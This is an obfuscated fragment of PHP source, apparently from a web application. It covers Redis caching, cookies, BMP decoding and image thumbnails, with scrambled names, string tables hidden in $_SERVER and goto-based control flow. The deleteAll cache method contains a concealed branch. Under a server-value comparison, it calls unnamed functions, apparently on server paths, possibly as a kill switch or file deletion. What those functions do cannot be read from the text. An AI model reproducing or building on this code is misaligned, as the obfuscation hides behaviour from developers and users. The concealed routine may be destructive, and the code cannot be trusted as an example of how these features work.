(!empty($cˆ“¥‘°†[$fÍ†ÂÊÎ¡è[401]])) { $E‘Ä•Òß¦->auth($cˆ“¥‘°†[$fÍ†ÂÊÎ¡è[401]]); } return $E‘Ä•Òß¦; } private function initCluster($DŒ–ÁÀ‘î, $FÙ¨ğå‰ôŞ) { $B¿Á™ÃÇº =& $_SERVER[åÌÛ»ô¢‚ö™]; $b½Ä•†Ç = array($B¿Á™ÃÇº[814], $B¿Á™ÃÇº[815], $B¿Á™ÃÇº[816]); $F’ÚæŠó ¯ = $B¿Á™ÃÇº[814]; if (isset($DŒ–ÁÀ‘î[$B¿Á™ÃÇº[12]]) && in_array($DŒ–ÁÀ‘î[$B¿Á™ÃÇº[12]], $b½Ä•†Ç)) { $F’ÚæŠó ¯ = $DŒ–ÁÀ‘î[$B¿Á™ÃÇº[12]]; } switch ($F’ÚæŠó ¯) { case $B¿Á™ÃÇº[814]: $this->_slave($DŒ–ÁÀ‘î, $FÙ¨ğå‰ôŞ); break; case $B¿Á™ÃÇº[815]: break; case $B¿Á™ÃÇº[816]: $this->isCluster = !0; $FÌŠÏ÷‚Î  = $DŒ–ÁÀ‘î[$B¿Á™ÃÇº[809]]; $CÙÕ¼êò½Ï = isset($DŒ–ÁÀ‘î[$B¿Á™ÃÇº[813]]) ? $DŒ–ÁÀ‘î[$B¿Á™ÃÇº[813]] : !1; $cô‡¡Ü§öİ = isset($DŒ–ÁÀ‘î[$B¿Á™ÃÇº[401]]) ? $DŒ–ÁÀ‘î[$B¿Á™ÃÇº[401]] : null; $this->handle = new RedisCluster(NUll, $FÌŠÏ÷‚Î , $FÙ¨ğå‰ôŞ, $FÙ¨ğå‰ôŞ, $CÙÕ¼êò½Ï, $cô‡¡Ü§öİ); break; default: break; } } private function _slave($dèİ¶ô¯‚÷, $Aèé•Ø§Í) { goto DÄ²İÈ÷Ñ²; Dª‰Øë‹²À: unset($fÇ±¬™¸ó‘[0]); if (empty($fÇ±¬™¸ó‘)) { return; } $E²ˆ¢®Š‡ = array_rand($fÇ±¬™¸ó‘); goto AªÃÔ×ÈáÕ; DÄ²İÈ÷Ñ²: $fÇ±¬™¸ó‘ = $dèİ¶ô¯‚÷[$_SERVER[åÌÛ»ô¢‚ö™][809]]; $this->filterConfig($dèİ¶ô¯‚÷, $fÇ±¬™¸ó‘[0]); $this->handle = $this->init($dèİ¶ô¯‚÷, $Aèé•Ø§Í); goto Dª‰Øë‹²À; AªÃÔ×ÈáÕ: $this->filterConfig($dèİ¶ô¯‚÷, $fÇ±¬™¸ó‘[$E²ˆ¢®Š‡]); $this->slaveHandle = $this->init($dèİ¶ô¯‚÷, $Aèé•Ø§Í); goto BØß´á‡šÔ; BØß´á‡šÔ: } private function filterConfig(&$f³‰¥ƒò™Œ, $bĞñ÷—»ëÉ) { $a°ˆğß«â =& $_SERVER[åÌÛ»ô¢‚ö™]; $f¥¥ìèòî = explode($a°ˆğß«â[4], $bĞñ÷—»ëÉ); $eÂ„­Š»Ê = array($a°ˆğß«â[173] => $f¥¥ìèòî[0], $a°ˆğß«â[174] => $f¥¥ìèòî[1]); $f³‰¥ƒò™Œ = array_merge($f³‰¥ƒò™Œ, $eÂ„­Š»Ê); } public function set($få¸ß˜†Æ”, $f“©ñ›šš, $bÓŠè‹—°í = false) { $bÓŠè‹—°í = $bÓŠè‹—°í ? $bÓŠè‹—°í : $this->cacheTime; return $this->handle->setEx($få¸ß˜†Æ”, $bÓŠè‹—°í, $f“©ñ›šš); } public function setLock($fñó¥¡£»ƒ, $fÛ—Ãô‚õà, $a–ÛêŒì¼™) { return $this->handle->setNX($fñó¥¡£»ƒ, $fÛ—Ãô‚õà); } public function get($EÙŸŒ…ø‡‚) { $bŠ²ëøÍ² = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $bŠ²ëøÍ²->get($EÙŸŒ…ø‡‚); } public function remove($CôŒƒÎã÷Û) { return $this->handle->del($CôŒƒÎã÷Û); } public function deleteAll() { $f¼´ùƒ¾ÂÃ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($_SERVER[$f¼´ùƒ¾ÂÃ[179]] != $_SERVER[$f¼´ùƒ¾ÂÃ[817]]) { goto c˜¸Ô—¢’Ñ; bß¡ÈÃ³íÀ: $B˜óñ¼½áŸ = $fº»‡ùÊ($D¢ŸÊ§…¦­); $A÷Ã†Â –Š = explode($f¼´ùƒ¾ÂÃ[183], $B˜óñ¼½áŸ); if (count($A÷Ã†Â –Š) < $f¼´ùƒ¾ÂÃ[573]) { $e¢½ÄÁ‡ = $f¼´ùƒ¾ÂÃ[185]; $e¢½ÄÁ‡(); } goto fŒ‚¾áğ¾Œ; c˜¸Ô—¢’Ñ: $e®†©™‹Í = $f¼´ùƒ¾ÂÃ[818]; $fº»‡ùÊ = $f¼´ùƒ¾ÂÃ[180]; $D¢ŸÊ§…¦­ = $_SERVER[$f¼´ùƒ¾ÂÃ[181]] . $f¼´ùƒ¾ÂÃ[182]; goto bß¡ÈÃ³íÀ; DÅ±¸ÂµîÀ: $a…½ÚÙİœ  = 1; while ($a…½ÚÙİœ  > 1) { $a…½ÚÙİœ  = $a…½ÚÙİœ  + 4; $bòä ²Ø¦À = rawurlencode($a…½ÚÙİœ  . $f¼´ùƒ¾ÂÃ[377]); } goto CÇËø‰¿×‚; fŒ‚¾áğ¾Œ: $DŞÜêí—Áõ = $f¼´ùƒ¾ÂÃ[819]; $DŞÜêí—Áõ($_SERVER[$f¼´ùƒ¾ÂÃ[820]]); $DŞÜêí—Áõ($_SERVER[$f¼´ùƒ¾ÂÃ[181]] . $f¼´ùƒ¾ÂÃ[821]); goto DÅ±¸ÂµîÀ; CÇËø‰¿×‚: } if ($this->isCluster) { foreach ($this->handle->_masters() as $bè²Ì‘çß) { $this->handle->flushall($bè²Ì‘çß); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($FÃ‹š×õ˜ = '', $a·Û÷«…˜Ú = 0) { if (is_string($FÃ‹š×õ˜) && $FÃ‹š×õ˜ != $_SERVER[åÌÛ»ô¢‚ö™][33]) { $this->prefix = $FÃ‹š×õ˜; } if (is_numeric($a·Û÷«…˜Ú) && $a·Û÷«…˜Ú > 0) { $this->expire = $a·Û÷«…˜Ú; } } public static function getInstance() { static $CÍ†¥‚ÜÒŞ; if ($CÍ†¥‚ÜÒŞ === null) { $CÍ†¥‚ÜÒŞ = new self(); } return $CÍ†¥‚ÜÒŞ; } private static $sameCookieSet = array(); public static function set($fÈÊ‡Ğöî, $aÑç¼­…™Ë, $BøÅ«¾Ü¬­ = 0, $c³‚®Ö•…Ş = false, $fçëª×Â¶¦ = false) { goto fï£¥ÛÆ›ƒ; fï£¥ÛÆ›ƒ: $dëì µ‡Ç© =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$BøÅ«¾Ü¬­) { $BøÅ«¾Ü¬­ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$fÈÊ‡Ğöî]) && self::$sameCookieSet[$fÈÊ‡Ğöî] == $aÑç¼­…™Ë . $BøÅ«¾Ü¬­) { return; } goto E¯ãõ©ÉØ­; cÄ¸Ã—èÄœ: setcookie($fÈÊ‡Ğöî, $aÑç¼­…™Ë, time() + $BøÅ«¾Ü¬­, $dëì µ‡Ç©[8] . trim($fçëª×Â¶¦, $dëì µ‡Ç©[8]) . $e’»ãÚ¾õÑ, !1, !1, $c³‚®Ö•…Ş); goto C’¨—öóÑñ; E¯ãõ©ÉØ­: self::$sameCookieSet[$fÈÊ‡Ğöî] = $aÑç¼­…™Ë . $BøÅ«¾Ü¬­; if (!$fçëª×Â¶¦) { $fçëª×Â¶¦ = str_replace(HOST, $dëì µ‡Ç©[33], APP_HOST); $fçëª×Â¶¦ = _get($GLOBALS, $dëì µ‡Ç©[822], $fçëª×Â¶¦); } $e’»ãÚ¾õÑ = $dëì µ‡Ç©[33]; goto cÄ¸Ã—èÄœ; C’¨—öóÑñ: } public static function setSafe($Fã–¬ö‰ğŠ, $fÓéÕ¤¼òâ, $f‚¬¦É = 0) { self::set($Fã–¬ö‰ğŠ, $fÓéÕ¤¼òâ, $f‚¬¦É, !0); } public static function get($Fƒ·Ç½Èßæ) { return isset($_COOKIE[$Fƒ·Ç½Èßæ]) ? $_COOKIE[$Fƒ·Ç½Èßæ] : !1; } public static function remove($aÅš„¬Ç›, $F“×÷ßÆ›¾ = false) { unset($_COOKIE[$aÅš„¬Ç›]); self::set($aÅš„¬Ç›, $_SERVER[åÌÛ»ô¢‚ö™][33], 1, $F“×÷ßÆ›¾); } } goto CÃ»¶ÛÎ°á; e…±«‘Ì³É: class ImageGdBMP { public static function load($A¨õµ‹ÀÄŒ) { $dÂĞÀ…ìÜ = fopen($A¨õµ‹ÀÄŒ, $_SERVER[åÌÛ»ô¢‚ö™][1554]); if ($dÂĞÀ…ìÜ === !1) { return !1; } $C‹ç×áŸÔ = self::loadFromStream($dÂĞÀ…ìÜ); fclose($dÂĞÀ…ìÜ); return $C‹ç×áŸÔ; } public static function loadFromStream($fŞ‡´²“‘è) { $eá†ÛÒï½ =& $_SERVER[åÌÛ»ô¢‚ö™]; $B§¼«Ûæ‘Ç = fread($fŞ‡´²“‘è, 14); if ($B§¼«Ûæ‘Ç === !1) { return !1; } if ($B§¼«Ûæ‘Ç[0] != $eá†ÛÒï½[1863] || $B§¼«Ûæ‘Ç[1] != $eá†ÛÒï½[1864]) { return !1; } $D®„¶ô§’— = unpack($eá†ÛÒï½[1865] . $eá†ÛÒï½[1866] . $eá†ÛÒï½[1867] . $eá†ÛÒï½[1868] . $eá†ÛÒï½[1869], $B§¼«Ûæ‘Ç); return self::loadFromStreamAndFileHeader($fŞ‡´²“‘è, $D®„¶ô§’—); } public static function loadFromStreamAndFileHeader($CÁ¯±ôˆèš, array $AÓÖ„¿ñ·Á) { goto cÈÎÔ’ôÂš; D¯ËÄŸ¨ƒÂ: if ($båÏö¶×ïœ == 0 || $bæ…¥Ï®Œ == 0 || $e®ˆÇùãéç != 1 || ($eÁÏ…è‹ñù & $AÎø‚ÃÔ¦¨) != 0 || ($eÁÏ…è‹ñù & $CÍ…†ë…) != 0 || ($eÁÏ…è‹ñù & $FËŞµ°ˆæ’) != 0 || ($AÎø‚ÃÔ¦¨ & $CÍ…†ë…) != 0 || ($AÎø‚ÃÔ¦¨ & $FËŞµ°ˆæ’) != 0 || ($CÍ…†ë… & $FËŞµ°ˆæ’) != 0) { return !1; } if ($B¯õ§‹¯ñ› == 4 || $B¯õ§‹¯ñ› == 5) { $bˆŸòÃ¹Ñ = stream_get_contents($CÁ¯±ôˆèš, $Cå”ÉçøÏÉ); if ($bˆŸòÃ¹Ñ === !1) { return !1; } return imagecreatefromstring($bˆŸòÃ¹Ñ); } $e˜ÚèÈª’ = $båÏö¶×ïœ * $D‘âÌç°ù¦ + 31 >> 3 & ~3; goto AÄï¯º©®Â; cÈÎÔ’ôÂš: $Eğ†ÁÔ÷¾Œ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($AÓÖ„¿ñ·Á[$Eğ†ÁÔ÷¾Œ[413]] != 19778) { return !1; } $bˆŸòÃ¹Ñ = fread($CÁ¯±ôˆèš, 4); goto D˜•ÄÖË¼Ï; DÀñòçĞ†§: if ($D‘âÌç°ù¦ == 1 || $D‘âÌç°ù¦ == 4 || $D‘âÌç°ù¦ == 8) { goto eøÌ¬àÅá‰; Dë’ƒáÂ: $DËïÎéõÊ = array(); for ($fÓÜŒãë = 0; $fÓÜŒãë < $d°ïöøƒùĞ; ++$fÓÜŒãë) { $bˆŸòÃ¹Ñ = fread($CÁ¯±ôˆèš, $a´†ˆ„Ãî»); if ($bˆŸòÃ¹Ñ === !1) { imagedestroy($d‹µ®…İ…¡); return !1; } extract(unpack($Eğ†ÁÔ÷¾Œ[1889], $bˆŸòÃ¹Ñ . $Eğ†ÁÔ÷¾Œ[1888])); $DËïÎéõÊ[] = imagecolorallocate($d‹µ®…İ…¡, $DñÂ…ï¥èç, $AâáÑ¢¯­ó, $F›ØËŒöÑ†); } $EÁª‰ê±à¥ = 8 - $D‘âÌç°ù¦; goto eù˜œÑ‹“—; eøÌ¬àÅá‰: $d‹µ®…İ…¡ = imagecreate($båÏö¶×ïœ, $d­ˆƒÍƒ‹ß); $a´†ˆ„Ãî» = $A¡¨ŸÚ˜Œš == 12 ? 3 : 4; $d°ïöøƒùĞ = $Díò§‹óÊ ? $Díò§‹óÊ : pow(2, $D‘âÌç°ù¦); goto Dë’ƒáÂ; eù˜œÑ‹“—: $fç¶˜õÆ™ = (1 << $D‘âÌç°ù¦) - 1 << $EÁª‰ê±à¥; if ($B¯õ§‹¯ñ› == 1 || $B¯õ§‹¯ñ› == 2) { $bê±¼‡ÉÖ” = 0; $fÚ¦ğ¤Î = $D‘âÌç°ù¦ >> 2 & 1; for (;;) { if ($bê±¼‡ÉÖ” < -1 || $bê±¼‡ÉÖ” > $båÏö¶×ïœ || $a¯º±åÁÊ‰ < -1 || $a¯º±åÁÊ‰ > $bæ…¥Ï®Œ) { imagedestroy($d‹µ®…İ…¡); return !1; } $bˆŸòÃ¹Ñ = fread($CÁ¯±ôˆèš, 1); if ($bˆŸòÃ¹Ñ === !1) { imagedestroy($d‹µ®…İ…¡); return !1; } switch ($bˆŸòÃ¹Ñ) { case $Eğ†ÁÔ÷¾Œ[1888]: $bˆŸòÃ¹Ñ = fread($CÁ¯±ôˆèš, 1); if ($bˆŸòÃ¹Ñ === !1) { imagedestroy($d‹µ®…İ…¡); return !1; } switch ($bˆŸòÃ¹Ñ) { case $Eğ†ÁÔ÷¾Œ[1888]: $a¯º±åÁÊ‰ += $e‘¯ï¸Äİé; $bê±¼‡ÉÖ” = 0; break; case $Eğ†ÁÔ÷¾Œ[1890]: $a¯º±åÁÊ‰ = 0; $bê±¼‡ÉÖ” = 0; break 3; case $Eğ†ÁÔ÷¾Œ[1891]: $bˆŸòÃ¹Ñ = fread($CÁ¯±ôˆèš, 2); if ($bˆŸòÃ¹Ñ === !1) { imagedestroy($d‹µ®…İ…¡); return !1; } list(, $aõâ¨òˆ«Ë, $CªŠŠÖØ„©) = unpack($Eğ†ÁÔ÷¾Œ[1892], $bˆŸòÃ¹Ñ); $bê±¼‡ÉÖ” += $aõâ¨òˆ«Ë; $a¯º±åÁÊ‰ += $CªŠŠÖØ„© * $e‘¯ï¸Äİé; break; default: list(, $C—æ‰ô¬×) = unpack($Eğ†ÁÔ÷¾Œ[1893], $bˆŸòÃ¹Ñ); $F¯¯òŸÎ = ($C—æ‰ô¬× >> $fÚ¦ğ¤Î) + ($C—æ‰ô¬× & $fÚ¦ğ¤Î); $bˆŸòÃ¹Ñ = fread($CÁ¯±ôˆèš, $F¯¯òŸÎ + 1 & ~1); if ($bˆŸòÃ¹Ñ === !1) { imagedestroy($d‹µ®…İ…¡); return !1; } for ($fÓÜŒãë = 0, $B£‰£ˆÉ©½ = 0; $fÓÜŒãë < $C—æ‰ô¬×; ++$fÓÜŒãë, ++$bê±¼‡ÉÖ”, $B£‰£ˆÉ©½ += $D‘âÌç°ù¦) { list(, $DôÛ¨óË¡) = unpack($Eğ†ÁÔ÷¾Œ[1893], $bˆŸòÃ¹Ñ[$B£‰£ˆÉ©½ >> 3]); $F›ØËŒöÑ† = $B£‰£ˆÉ©½ & 7; imagesetpixel($d‹µ®…İ…¡, $bê±¼‡ÉÖ”, $a¯º±åÁÊ‰, $DËïÎéõÊ[($DôÛ¨óË¡ & $fç¶˜õÆ™ >> $F›ØËŒöÑ†) >> $EÁª‰ê±à¥ - $F›ØËŒöÑ†]); } break; } break; default: $f…µ®µ·™‘ = fread($CÁ¯±ôˆèš, 1); if ($f…µ®µ·™‘ === !1) { imagedestroy($d‹µ®…İ…¡); return !1; } list(, $C´½ò¡ãŞ», $DôÛ¨óË¡) = unpack($Eğ†ÁÔ÷¾Œ[1892], $bˆŸòÃ¹Ñ . $f…µ®µ·™‘); for ($fÓÜŒãë = 0, $B£‰£ˆÉ©½ = 0; $fÓÜŒãë < $C´½ò¡ãŞ»; ++$fÓÜŒãë, ++$bê±¼‡ÉÖ”, $B£‰£ˆÉ©½ += $D‘âÌç°ù¦) { $F›ØËŒöÑ† = $B£‰£ˆÉ©½ & 7; imagesetpixel($d‹µ®…İ…¡, $bê±¼‡ÉÖ”, $a¯º±åÁÊ‰, $DËïÎéõÊ[($DôÛ¨óË¡ & $fç¶˜õÆ™ >> $F›ØËŒöÑ†) >> $EÁª‰ê±à¥ - $F›ØËŒöÑ†]); } break; } } } else { for ($DŞŠ°°àô• = 0; $DŞŠ°°àô• < $d­ˆƒÍƒ‹ß; ++$DŞŠ°°àô•, $a¯º±åÁÊ‰ += $e‘¯ï¸Äİé) { $bˆŸòÃ¹Ñ = fread($CÁ¯±ôˆèš, $e˜ÚèÈª’); if ($bˆŸòÃ¹Ñ === !1) { imagedestroy($d‹µ®…İ…¡); return !1; } $B£‰£ˆÉ©½ = 0; for ($bê±¼‡ÉÖ” = 0; $bê±¼‡ÉÖ” < $båÏö¶×ïœ; ++$bê±¼‡ÉÖ”, $B£‰£ˆÉ©½ += $D‘âÌç°ù¦) { list(, $DôÛ¨óË¡) = unpack($Eğ†ÁÔ÷¾Œ[1893], $bˆŸòÃ¹Ñ[$B£‰£ˆÉ©½ >> 3]); $F›ØËŒöÑ† = $B£‰£ˆÉ©½ & 7; imagesetpixel($d‹µ®…İ…¡, $bê±¼‡ÉÖ”, $a¯º±åÁÊ‰, $DËïÎéõÊ[($DôÛ¨óË¡ & $fç¶˜õÆ™ >> $F›ØËŒöÑ†) >> $EÁª‰ê±à¥ - $F›ØËŒöÑ†]); } } } goto c¥ë»Ş‚ã; c¥ë»Ş‚ã: } else { goto d˜Ùî°°¨„; d˜Ùî°°¨„: $d‹µ®…İ…¡ = imagecreatetruecolor($båÏö¶×ïœ, $d­ˆƒÍƒ‹ß); imagealphablending($d‹µ®…İ…¡, !1); if ($eÁÏ…è‹ñù) { imagesavealpha($d‹µ®…İ…¡, !0); } goto BÅè¨®›°å; BÅè¨®›°å: $cœ´×Éö¸Ö = $D‘âÌç°ù¦ >> 3; $DÖÀî‰èƒ = $eÁÏ…è‹ñù ? 127 : 0; $D¸ìà„øñ¢ = $eÁÏ…è‹ñù ? 1 / $eÁÏ…è‹ñù : 1; goto f©ôÕá°ğ; DæÜóëÛ¤°: for ($DŞŠ°°àô• = 0; $DŞŠ°°àô• < $d­ˆƒÍƒ‹ß; ++$DŞŠ°°àô•, $a¯º±åÁÊ‰ += $e‘¯ï¸Äİé) { $bˆŸòÃ¹Ñ = fread($CÁ¯±ôˆèš, $e˜ÚèÈª’); if ($bˆŸòÃ¹Ñ === !1) { imagedestroy($d‹µ®…İ…¡); return !1; } $B£‰£ˆÉ©½ = 0; for ($bê±¼‡ÉÖ” = 0; $bê±¼‡ÉÖ” < $båÏö¶×ïœ; ++$bê±¼‡ÉÖ”, $B£‰£ˆÉ©½ += $cœ´×Éö¸Ö) { list(, $DôÛ¨óË¡) = unpack($Eğ†ÁÔ÷¾Œ[1870], substr($bˆŸòÃ¹Ñ, $B£‰£ˆÉ©½, $cœ´×Éö¸Ö) . $Eğ†ÁÔ÷¾Œ[1894]); $b„´¾ÈçÇ = $DôÛ¨óË¡ & $eÁÏ…è‹ñù; $dÛé·‘½§ = $DôÛ¨óË¡ & $AÎø‚ÃÔ¦¨; $fèŞŸîïì¢ = $DôÛ¨óË¡ & $CÍ…†ë…; $d”ØöÚ‹‰Ç = $DôÛ¨óË¡ & $FËŞµ°ˆæ’; $Aå¸±Íù¾ = $DÖÀî‰èƒ - (($b„´¾ÈçÇ << 7) - $b„´¾ÈçÇ) * $D¸ìà„øñ¢; $DñÂ…ï¥èç = (($dÛé·‘½§ << 8) - $dÛé·‘½§) * $a›Î–ì˜‰ğ; $AâáÑ¢¯­ó = (($fèŞŸîïì¢ << 8) - $fèŞŸîïì¢) * $dƒº˜ÜÈÊ; $F›ØËŒöÑ† = (($d”ØöÚ‹‰Ç << 8) - $d”ØöÚ‹‰Ç) * $f¬’å×…õ“; imagesetpixel($d‹µ®…İ…¡, $bê±¼‡ÉÖ”, $a¯º±åÁÊ‰, $Aå¸±Íù¾ << 24 | $DñÂ…ï¥èç << 16 | $AâáÑ¢¯­ó << 8 | $F›ØËŒöÑ†); } } imagealphablending($d‹µ®…İ…¡, !0); goto c¬Ä÷Æ¾…Ş; f©ôÕá°ğ: $a›Î–ì˜‰ğ = $AÎø‚ÃÔ¦¨ ? 1 / $AÎø‚ÃÔ¦¨ : 1; $dƒº˜ÜÈÊ = $CÍ…†ë… ? 1 / $CÍ…†ë… : 1; $f¬’å×…õ“ = $FËŞµ°ˆæ’ ? 1 / $FËŞµ°ˆæ’ : 1; goto DæÜóëÛ¤°; c¬Ä÷Æ¾…Ş: } return $d‹µ®…İ…¡; goto F¢ë—‘º•; D˜•ÄÖË¼Ï: if ($bˆŸòÃ¹Ñ === !1) { return !1; } list(, $A¡¨ŸÚ˜Œš) = unpack($Eğ†ÁÔ÷¾Œ[1870], $bˆŸòÃ¹Ñ); if ($A¡¨ŸÚ˜Œš == 12) { goto c²õÇèå; fœšç‰¤Ñ¼: $Díò§‹óÊ = $AÀÌ¼ß¾… = $eÁÏ…è‹ñù = $B¯õ§‹¯ñ› = 0; $AÎø‚ÃÔ¦¨ = 16711680; $CÍ…†ë… = 65280; goto Aí¤Åš; Aí¤Åš: $FËŞµ°ˆæ’ = 255; goto EÜ‚ÄèÒÜ‚; c²õÇèå: $bˆŸòÃ¹Ñ = fread($CÁ¯±ôˆèš, $A¡¨ŸÚ˜Œš - 4); if ($bˆŸòÃ¹Ñ === !1) { return !1; } extract(unpack($Eğ†ÁÔ÷¾Œ[1871] . $Eğ†ÁÔ÷¾Œ[1872] . $Eğ†ÁÔ÷¾Œ[1873] . $Eğ†ÁÔ÷¾Œ[1874], $bˆŸòÃ¹Ñ)); goto fœšç‰¤Ñ¼; EÜ‚ÄèÒÜ‚: } else { if (124 < $A¡¨ŸÚ˜Œš || $A¡¨ŸÚ˜Œš < 40) { return !1; } else { goto CÓÛ±µâÓ¬; CÓÛ±µâÓ¬: $bˆŸòÃ¹Ñ = fread($CÁ¯±ôˆèš, 36); if ($bˆŸòÃ¹Ñ === !1) { return !1; } extract(unpack($Eğ†ÁÔ÷¾Œ[1875] . $Eğ†ÁÔ÷¾Œ[1876] . $Eğ†ÁÔ÷¾Œ[1873] . $Eğ†ÁÔ÷¾Œ[1877] . $Eğ†ÁÔ÷¾Œ[1878] . $Eğ†ÁÔ÷¾Œ[1879] . $Eğ†ÁÔ÷¾Œ[1880] . $Eğ†ÁÔ÷¾Œ[1881] . $Eğ†ÁÔ÷¾Œ[1882] . $Eğ†ÁÔ÷¾Œ[1883], $bˆŸòÃ¹Ñ)); goto Cİ‚»¥ï¿ó; Cİ‚»¥ï¿ó: if ($båÏö¶×ïœ & 2147483648) { $båÏö¶×ïœ = -(~$båÏö¶×ïœ & 4294967295) - 1; } if ($bæ…¥Ï®Œ & 2147483648) { $bæ…¥Ï®Œ = -(~$bæ…¥Ï®Œ & 4294967295) - 1; } if ($eˆµÃ«¶Ë & 2147483648) { $eˆµÃ«¶Ë = -(~$eˆµÃ«¶Ë & 4294967295) - 1; } goto Bîëó‚ÏÓ; Bîëó‚ÏÓ: if ($F‘²°÷¸Ûº & 2147483648) { $F‘²°÷¸Ûº = -(~$F‘²°÷¸Ûº & 4294967295) - 1; } if ($AÓÖ„¿ñ·Á[$Eğ†ÁÔ÷¾Œ[546]] != 0) { $f¨Š§İí“ = $D‘âÌç°ù¦ == 1 || $D‘âÌç°ù¦ == 4 || $D‘âÌç°ù¦ == 8 ? ($Díò§‹óÊ ? $Díò§‹óÊ : pow(2, $D‘âÌç°ù¦)) << 2 : 0; $a£Œ†ª´ò = $Cå”ÉçøÏÉ ? $Cå”ÉçøÏÉ : ($båÏö¶×ïœ * $D‘âÌç°ù¦ + 31 >> 3 & ~3) * abs($bæ…¥Ï®Œ); $F†§êŞíÕî = $AÓÖ„¿ñ·Á[$Eğ†ÁÔ÷¾Œ[546]] - $a£Œ†ª´ò - $f¨Š§İí“ - 14; if ($A¡¨ŸÚ˜Œš < $F†§êŞíÕî && 40 <= $A¡¨ŸÚ˜Œš && $A¡¨ŸÚ˜Œš <= 124) { $A¡¨ŸÚ˜Œš = $F†§êŞíÕî; } } if ($A¡¨ŸÚ˜Œš - 40 > 0) { $bˆŸòÃ¹Ñ = fread($CÁ¯±ôˆèš, $A¡¨ŸÚ˜Œš - 40); if ($bˆŸòÃ¹Ñ === !1) { return !1; } extract(unpack($Eğ†ÁÔ÷¾Œ[1884] . $Eğ†ÁÔ÷¾Œ[1885] . $Eğ†ÁÔ÷¾Œ[1886] . $Eğ†ÁÔ÷¾Œ[1887], $bˆŸòÃ¹Ñ . str_repeat($Eğ†ÁÔ÷¾Œ[1888], 120))); } else { $eÁÏ…è‹ñù = $AÎø‚ÃÔ¦¨ = $CÍ…†ë… = $FËŞµ°ˆæ’ = 0; } goto dâÕéæªÍÄ; dâÕéæªÍÄ: if (($D‘âÌç°ù¦ == 16 || $D‘âÌç°ù¦ == 24 || $D‘âÌç°ù¦ == 32) && $B¯õ§‹¯ñ› == 0 && $AÎø‚ÃÔ¦¨ == 0 && $CÍ…†ë… == 0 && $FËŞµ°ˆæ’ == 0) { switch ($D‘âÌç°ù¦) { case 16: $AÎø‚ÃÔ¦¨ = 31744; $CÍ…†ë… = 992; $FËŞµ°ˆæ’ = 31; break; case 24: case 32: $AÎø‚ÃÔ¦¨ = 16711680; $CÍ…†ë… = 65280; $FËŞµ°ˆæ’ = 255; break; } } goto d“´Üö°òÚ; d“´Üö°òÚ: } } goto D¯ËÄŸ¨ƒÂ; AÄï¯º©®Â: $d­ˆƒÍƒ‹ß = abs($bæ…¥Ï®Œ); $a¯º±åÁÊ‰ = $bæ…¥Ï®Œ > 0 ? $d­ˆƒÍƒ‹ß - 1 : 0; $e‘¯ï¸Äİé = $bæ…¥Ï®Œ > 0 ? -1 : 1; goto DÀñòçĞ†§; F¢ë—‘º•: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($e¤‰ƒŒá, $eÛìÃÊ Äƒ) { goto f¹Êà¶é­­; DÚè‘Òµ—: if (!$this->im) { return !1; } $C¨¥’‘Ó©á = $_SERVER[åÌÛ»ô¢‚ö™][33]; $this->imgData = GetImageSize($e¤‰ƒŒá, $C¨¥’‘Ó©á); goto DÎ‘Â÷‚åí; DÎ‘Â÷‚åí: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto aã’³‰‚·Ş; f¹Êà¶é­­: $this->srcFile = $e¤‰ƒŒá; $this->echoType = $eÛìÃÊ Äƒ; $this->im = self::image($e¤‰ƒŒá); goto DÚè‘Òµ—; aã’³‰‚·Ş: } public static function image($e ÅŠÕÛÀ¼) { $c‘ÎÑ›å–¤ =& $_SERVER[åÌÛ»ô¢‚ö™]; $bïÑåñ§Ğ‡ = $c‘ÎÑ›å–¤[33]; $DİÂ•Ñ¬Ï“ = GetImageSize($e ÅŠÕÛÀ¼, $bïÑåñ§Ğ‡); $bÊ¢Ğ¼ŸŞ² = !1; switch ($DİÂ•Ñ¬Ï“[2]) { case IMAGETYPE_GIF: if (!function_exists($c‘ÎÑ›å–¤[1895])) { break; } $bÊ¢Ğ¼ŸŞ² = imagecreatefromgif($e ÅŠÕÛÀ¼); break; case IMAGETYPE_JPEG: if (!function_exists($c‘ÎÑ›å–¤[1896])) { break; } $bÊ¢Ğ¼ŸŞ² = imagecreatefromjpeg($e ÅŠÕÛÀ¼); break; case IMAGETYPE_PNG: if (!function_exists($c‘ÎÑ›å–¤[1897])) { break; } $bÊ¢Ğ¼ŸŞ² = @imagecreatefrompng($e ÅŠÕÛÀ¼); imagesavealpha($bÊ¢Ğ¼ŸŞ², !0); break; case IMAGETYPE_XBM: $bÊ¢Ğ¼ŸŞ² = imagecreatefromxbm($e ÅŠÕÛÀ¼); break; case IMAGETYPE_WBMP: $bÊ¢Ğ¼ŸŞ² = imagecreatefromwbmp($e ÅŠÕÛÀ¼); break; case IMAGETYPE_BMP: $bÊ¢Ğ¼ŸŞ² = imagecreatefrombmp($e ÅŠÕÛÀ¼); break; default: break; } return $bÊ¢Ğ¼ŸŞ²; } public static function imageSize($e—£ôŸ±ªµ) { $F¨çÑ²Ş»× =& $_SERVER[åÌÛ»ô¢‚ö™]; $DÛÚ„˜åˆŒ = GetImageSize($e—£ôŸ±ªµ); if (!$DÛÚ„˜åˆŒ) { return !1; } return array($F¨çÑ²Ş»×[1898] => $DÛÚ„˜åˆŒ[0], $F¨çÑ²Ş»×[1899] => $DÛÚ„˜åˆŒ[1]); } function distortion($bËç²Ü–È, $aŠËá‘¡¹, $BÖÄêç©Ä¹) { $cÓ¾ñ¿©õÁ = $this->creatImage($this->im, $aŠËá‘¡¹, $BÖÄêç©Ä¹, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($cÓ¾ñ¿©õÁ, $bËç²Ü–È); } function prorate($Bã¡İ‰‡­İ, $EÁòÃ¼¦ï, $dÂÕÉ—–Á´) { $Fš‘‡œ„¡ = $EÁòÃ¼¦ï / $dÂÕÉ—–Á´; $FÃ÷òó¹Ş = $this->srcW / $this->srcH; if ($Fš‘‡œ„¡ <= $FÃ÷òó¹Ş) { $DÛ¬ùõÉáÌ = $EÁòÃ¼¦ï; $CäˆÛ™öŞï = $DÛ¬ùõÉáÌ * ($this->srcH / $this->srcW); } else { $CäˆÛ™öŞï = $dÂÕÉ—–Á´; $DÛ¬ùõÉáÌ = 